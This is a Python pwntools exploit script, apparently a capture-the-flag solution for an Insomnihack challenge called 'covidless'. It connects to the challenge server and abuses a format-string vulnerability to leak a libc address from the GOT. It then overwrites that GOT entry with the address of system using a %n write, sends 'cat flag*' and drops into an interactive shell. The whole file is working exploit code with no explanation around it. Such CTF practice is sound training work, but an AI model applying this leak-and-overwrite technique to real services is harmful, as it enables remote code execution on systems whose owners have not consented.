#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'


libc = ELF('./libc.so.6')


p = connect('covidless.insomnihack.ch', 6666)
p.sendline('%13$s...'+p64(0x601028))
p.recvuntil('invalid : ', drop=True)
temp  = p.recvuntil('...',drop=True)
leak = u64(temp.ljust(8,'\x00'))

libc.address = leak - 0x64e80
print("libc.base = "+hex(libc.address))


low1 = libc.symbols['system'] & 0xffffffff
payload = '%'+str(low1)+'c%15$n'
payload = payload.ljust(20,'A')+'XYZZ'+p64(0x601028)
print(payload)

print('trying payload...(wait)')
p.sendline(payload)

p.recvuntil('XYZZ', drop=True)

p.sendline('cat flag*')
p.interactive()
p.close()


